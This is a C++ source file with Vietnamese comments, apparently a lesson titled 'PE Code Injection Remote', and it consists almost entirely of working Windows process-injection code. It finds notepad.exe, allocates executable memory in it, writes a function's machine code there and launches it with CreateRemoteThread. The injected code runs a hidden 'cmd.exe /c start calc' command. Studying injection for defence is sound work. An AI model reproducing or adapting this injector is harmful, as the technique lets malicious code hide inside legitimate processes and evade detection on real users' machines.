#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối gánh luồng xử lý độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm chức năng sẽ được bốc tách mã máy để tiêm sang Notepad
// Hàm này tuân thủ tuyệt đối quy tắc độc lập vị trí: CHỈ dùng dữ liệu từ lpParam
DWORD WINAPI InjectedFunction(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Khai hỏa bằng con trỏ tuyệt đối, né hoàn toàn hàng rào Loader Lock và lỗi RIP-Relative
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Hàm rỗng đánh dấu điểm kết thúc kịch khung để ước tính dung lượng mã máy
DWORD WINAPI InjectedFunctionEnd() { return 0; }

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 09: PE CODE INJECTION REMOTE" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo Notepad truoc." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }

    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;

    // Tính toán kích thước động an toàn cho khối lệnh thực thi
    SIZE_T functionSize = 500;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess that bai!" << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }

    // ─── BƯỚC 1: CẤP PHÁT VÙNG NHỚ TỪ XA MANG QUYỀN RWX ĐỂ CHỨA MÃ MÁY CỦA HÀM ───
    LPVOID remoteCodeBuffer = VirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Cấp phát phân vùng dữ liệu từ xa mang quyền RW để chứa tham số cấu trúc tuyệt đối
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteCodeBuffer || !pRemoteData) {
        std::cerr << "[-] VirtualAllocEx tu xa that bai!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Vung nho Code RWX trong Notepad dat tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // ─── BƯỚC 2: KHỞI TẠO DỮ LIỆU TUYỆT ĐỐI VÀ ĐẨY XUYÊN BIÊN GIỚI SANG RAM ĐÍCH ───
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        // Trích xuất chính xác tọa độ tuyệt đối của WinExec nạp sang Notepad
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Tiến hành ánh xạ chép khối mã máy và cấu trúc dữ liệu sang RAM đối phương
    WriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)InjectedFunction, functionSize, NULL);
    WriteProcessMemory(hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);
    std::cout << "[+] Anh xa tung segment ma may va du lieu sang RAM doi phuong hoan tat." << std::endl;

    std::cout << "[*] Dang khoi tao luong CreateRemoteThread de kich no..." << std::endl;

    // ─── BƯỚC 3: ÉP TIẾN TRÌNH ĐÍCH TỰ SINH LUỒNG CHẠY MÃ MÁY ───
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, pRemoteData, 0, NULL);

    if (hThread != NULL) {
        // Sử dụng cờ INFINITE để đảm bảo tiến trình hoàn tất việc mở máy tính một cách an toàn
        WaitForSingleObject(hThread, INFINITE);
        std::cout << "[+] Luong Thread tu xa da hoan thanh nhiem vu kich no!" << std::endl;
        CloseHandle(hThread);
    }
    else {
        std::cerr << "[-] CreateRemoteThread failed! Error: " << GetLastError() << std::endl;
    }

    // ─── BƯỚC 4: GIẢI PHÓNG TÀI NGUYÊN CHỐNG MEMORY LEAK ───
    VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::cout << "\n[+] PE Code Injection Process Completed Successfully!" << std::endl;
    std::cout << "[*] Nhan phim Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}